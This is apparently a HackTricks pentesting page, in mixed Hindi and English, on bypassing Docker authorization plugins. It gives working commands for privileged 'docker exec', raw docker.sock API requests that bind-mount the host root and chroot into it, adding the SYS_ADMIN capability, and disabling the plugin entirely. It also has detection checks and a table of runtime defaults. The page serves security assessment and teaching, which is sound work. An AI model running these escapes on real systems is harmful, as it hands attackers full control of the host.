# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

Runtime authorization plugins एक अतिरिक्त policy layer होते हैं, जो यह तय करते हैं कि कोई caller किसी दिए गए daemon action को कर सकता है या नहीं। Docker इसका classic example है। डिफ़ॉल्ट रूप से, जो भी Docker daemon से बात कर सकता है, उसके पास प्रभावी रूप से daemon पर व्यापक control होता है। Authorization plugins authenticated user और requested API operation की जांच करके, policy के अनुसार request को allow या deny करके, इस model को सीमित करने का प्रयास करते हैं।

यह विषय अपने अलग page का हकदार है, क्योंकि जब attacker के पास पहले से Docker API या `docker` group के किसी user का access हो, तो यह exploitation model को बदल देता है। ऐसे environments में सवाल केवल "क्या मैं daemon तक पहुंच सकता हूं?" नहीं रह जाता, बल्कि "क्या daemon किसी authorization layer से सुरक्षित है, और यदि है, तो क्या उस layer को unhandled endpoints, कमजोर JSON parsing या plugin-management permissions के माध्यम से bypass किया जा सकता है?" भी महत्वपूर्ण हो जाता है।

## Operation

जब कोई request Docker daemon तक पहुंचती है, तो authorization subsystem request context को एक या अधिक installed plugins तक भेज सकता है। Plugin authenticated user identity, request details, चुने गए headers और request या response body के उन हिस्सों को देखता है, जहां content type उपयुक्त हो। Multiple plugins को chain किया जा सकता है, और access तभी दिया जाता है जब सभी plugins request को allow करें।

यह model मजबूत प्रतीत होता है, लेकिन इसकी safety पूरी तरह इस बात पर निर्भर करती है कि policy author API को कितनी पूर्णता से समझता है। ऐसा plugin जो `docker run --privileged` को block करता है, लेकिन `docker exec` को ignore करता है, top-level `Binds` जैसे alternate JSON keys को miss करता है, या plugin administration की अनुमति देता है, restriction का false sense of security पैदा कर सकता है और फिर भी direct privilege-escalation paths खुले छोड़ सकता है।

## Common Plugin Targets

Policy review के लिए महत्वपूर्ण क्षेत्र हैं:

- container creation endpoints
- `HostConfig` fields जैसे `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` और namespace-sharing options
- `docker exec` का behavior
- plugin management endpoints
- ऐसा कोई भी endpoint जो intended policy model के बाहर runtime actions को indirectly trigger कर सकता है

Historically, Twistlock का `authz` plugin और `authobot` जैसे simple educational plugins इस model का अध्ययन आसान बनाते थे, क्योंकि उनकी policy files और code paths यह दिखाती थीं कि endpoint-to-action mapping वास्तव में कैसे implement की गई थी। Assessment work के लिए महत्वपूर्ण lesson यह है कि policy author को केवल सबसे visible CLI commands के बजाय पूरी API surface को समझना चाहिए।

## Abuse

पहला लक्ष्य यह जानना है कि वास्तव में क्या blocked है। यदि daemon किसी action को deny करता है, तो error अक्सर plugin name को leak कर देती है, जिससे उपयोग में लिए जा रहे control की पहचान करने में सहायता मिलती है:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
यदि आपको व्यापक endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे tools उपयोगी हैं, क्योंकि वे यह जांचने के अन्यथा दोहराव वाले task को स्वचालित करते हैं कि plugin द्वारा कौन-से API routes और JSON structures वास्तव में permitted हैं।

यदि environment custom plugin का उपयोग करता है और आप API के साथ interact कर सकते हैं, तो enumerate करें कि कौन-से object fields वास्तव में filtered हैं:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
ये checks महत्वपूर्ण हैं क्योंकि कई authorization failures concept-specific के बजाय field-specific होते हैं। कोई plugin CLI pattern को reject कर सकता है, लेकिन equivalent API structure को पूरी तरह block नहीं करता।

### पूर्ण उदाहरण: `docker exec` Container Creation के बाद Privilege जोड़ता है

ऐसी policy जो privileged container creation को block करती है, लेकिन unconfined container creation और `docker exec` की अनुमति देती है, फिर भी bypass की जा सकती है:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
यदि daemon दूसरे चरण को स्वीकार कर लेता है, तो user ने container के अंदर एक privileged interactive process पुनः प्राप्त कर लिया है, जिसे policy author ने constrained माना था।

### पूर्ण उदाहरण: Raw API के माध्यम से Bind Mount

कुछ broken policies केवल एक JSON shape का निरीक्षण करती हैं। यदि root filesystem bind mount को लगातार block नहीं किया जाता है, तो host को अभी भी mount किया जा सकता है:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
यही विचार `HostConfig` के अंतर्गत भी दिखाई दे सकता है:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
इसका प्रभाव full host filesystem escape है। दिलचस्प बात यह है कि bypass kernel bug के बजाय incomplete policy coverage से होता है।

### पूरा उदाहरण: Unchecked Capability Attribute

यदि policy किसी capability-related attribute को filter करना भूल जाती है, तो attacker ऐसा container बना सकता है जो एक dangerous capability फिर से प्राप्त कर ले:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
एक बार `CAP_SYS_ADMIN` या इसी तरह की strong capability मौजूद हो जाने पर, [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में बताई गई कई breakout techniques उपलब्ध हो जाती हैं।

### पूरा उदाहरण: Plugin को अक्षम करना

यदि plugin-management operations की अनुमति हो, तो सबसे साफ़ bypass पूरे control को बंद कर देना हो सकता है:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
यह control-plane स्तर पर policy की विफलता है। Authorization layer मौजूद है, लेकिन जिस user को प्रतिबंधित करना था, उसके पास इसे disable करने की permission अभी भी बनी हुई है।

## जांच

इन commands का उद्देश्य यह पहचानना है कि कोई policy layer मौजूद है या नहीं, और क्या वह पूरी या केवल सतही प्रतीत होती है।
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
यहाँ क्या महत्वपूर्ण है:

- ऐसे Denial messages जिनमें plugin name शामिल हो, authorization layer की पुष्टि करते हैं और अक्सर exact implementation प्रकट करते हैं।
- Attacker को दिखाई देने वाली plugin list यह पता लगाने के लिए पर्याप्त हो सकती है कि disable या reconfigure operations संभव हैं या नहीं।
- ऐसी policy जो केवल स्पष्ट CLI actions को block करती है, लेकिन raw API requests को नहीं, उसे तब तक bypassable माना जाना चाहिए जब तक इसके विपरीत सिद्ध न हो।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Default रूप से enabled नहीं | Authorization plugin configure न होने पर Daemon access प्रभावी रूप से all-or-nothing होता है | incomplete plugin policy, allowlists के बजाय blacklists, plugin management की अनुमति, field-level blind spots |
| Podman | कोई सामान्य direct equivalent नहीं | Podman आमतौर पर Docker-style authz plugins की तुलना में Unix permissions, rootless execution और API exposure decisions पर अधिक निर्भर करता है | rootful Podman API को व्यापक रूप से expose करना, weak socket permissions |
| containerd / CRI-O | अलग control model | ये runtimes आमतौर पर Docker authz plugins के बजाय socket permissions, node trust boundaries और higher-layer orchestrator controls पर निर्भर करते हैं | workloads में socket mount करना, weak node-local trust assumptions |
| Kubernetes | Docker authz plugins के बजाय API-server और kubelet layers पर authn/authz का उपयोग करता है | Cluster RBAC और admission controls मुख्य policy layer हैं | overbroad RBAC, weak admission policy, kubelet या runtime APIs को सीधे expose करना |
{{#include ../../../banners/hacktricks-training.md}}
